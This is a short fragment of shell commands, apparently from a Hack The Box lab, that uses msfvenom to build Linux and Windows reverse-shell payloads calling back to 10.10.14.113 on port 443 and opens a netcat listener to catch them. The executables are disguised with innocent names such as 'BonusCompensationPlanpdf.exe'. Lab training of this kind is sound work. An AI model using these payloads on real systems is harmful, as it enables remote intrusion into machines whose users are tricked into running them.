...
```shell
Pwn1Sec@htb[/htb]$ msfvenom -l payloads
...
```shell
Pwn1Sec@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
...
```shell
Pwn1Sec@htb[/htb]$ sudo nc -lvnp 443
```
...
```shell
Pwn1Sec@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
